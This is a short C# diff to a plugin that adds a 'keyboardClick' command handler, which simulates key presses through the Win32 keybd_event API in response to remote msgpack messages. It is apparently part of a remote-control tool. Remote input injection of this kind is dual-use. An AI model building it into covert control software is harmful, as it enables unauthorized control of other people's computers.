@@ -56,6 +56,14 @@ namespace Plugin
                                     IsOk = false;
                                     break;
                                 }
+
+                            case "keyboardClick":
+                                {
+                                    bool keyDown = Convert.ToBoolean(unpack_msgpack.ForcePathObject("keyIsDown").AsString);
+                                    byte key = Convert.ToByte(unpack_msgpack.ForcePathObject("key").AsInteger);
+                                    keybd_event(key, 0, keyDown ? (uint)0x0000 : (uint)0x0002, UIntPtr.Zero);
+                                    break;
+                                }
                         }
                         break;
                     }
@@ -131,5 +139,8 @@ namespace Plugin
 
         [DllImport("user32.dll")]
         static extern void mouse_event(int dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
+
+        [DllImport("user32.dll")]
+        internal static extern bool keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
     }
 }
